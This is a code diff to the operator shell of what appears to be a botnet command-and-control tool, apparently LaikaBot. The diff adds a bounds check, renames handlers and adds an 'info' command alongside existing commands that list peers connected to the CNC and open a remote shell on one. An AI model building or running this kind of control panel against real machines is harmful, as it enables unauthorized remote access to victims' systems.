@@ -20,7 +20,7 @@ jmp_buf cmdE_err;
 tShell_cmdDef *shellS_findCmd(char *cmd);
 
 tShell_peer *shellS_getPeer(tShell_client *client, int id) {
-    if (id >= client->peerTblCount || client->peerTbl[id] == NULL)
+    if (id < 0 || id >= client->peerTblCount || client->peerTbl[id] == NULL)
         CMD_ERROR("Not a valid peer ID! [%d]\n", id);
 
     return client->peerTbl[id];
@@ -39,21 +39,33 @@ void quitCMD(tShell_client *client, int args, char *argc[]) {
     laikaS_kill(&client->peer->sock);
 }
 
-void listPeers(tShell_client *client, int args, char *argc[]) {
+void listPeersCMD(tShell_client *client, int args, char *argc[]) {
     int i;
 
-    shellT_printf("\n");
     for (i = 0; i < client->peerTblCount; i++) {
         if (client->peerTbl[i]) {
             shellT_printf("%04d ", i);
             shellP_printInfo(client->peerTbl[i]);
-            shellT_printf("\n");
         }
     }
-    shellT_printf("\n");
 }
 
-void openShell(tShell_client *client, int args, char *argc[]) {
+void infoCMD(tShell_client *client, int args, char *argc[]) {
+    tShell_peer *peer;
+    int id;
+
+    if (args < 2)
+        CMD_ERROR("Usage: info [PEER_ID]\n");
+
+    id = shellS_readInt(argc[1]);
+    peer = shellS_getPeer(client, id);
+
+    /* print info */
+    shellT_printf("%04d ", id);
+    shellP_printInfo(peer);
+}
+
+void openShellCMD(tShell_client *client, int args, char *argc[]) {
     uint8_t buf[LAIKA_SHELL_DATA_MAX_LENGTH];
     tShell_peer *peer;
     int id, sz, cols, rows;
@@ -100,8 +112,9 @@ void openShell(tShell_client *client, int args, char *argc[]) {
 tShell_cmdDef shellS_cmds[] = {
     CREATECMD("help", "Lists avaliable commands", helpCMD),
     CREATECMD("quit", "Disconnects from CNC, closing panel", quitCMD),
-    CREATECMD("list", "Lists all connected peers to CNC", listPeers),
-    CREATECMD("shell", "Opens a shell on peer", openShell),
+    CREATECMD("list", "Lists all connected peers to CNC", listPeersCMD),
+    CREATECMD("info", "Lists info on a peer", infoCMD),
+    CREATECMD("shell", "Opens a shell on peer", openShellCMD),
 };
 
 #undef CREATECMD
@@ -174,7 +187,6 @@ void shellS_runCmd(tShell_client *client, char *cmd) {
     if (setjmp(cmdE_err) == 0) {
         cmdDef->callback(client, args, argc);
     }
-    shellT_printf("\n");
 
     /* free our argument buffer */
     laikaM_free(argc);
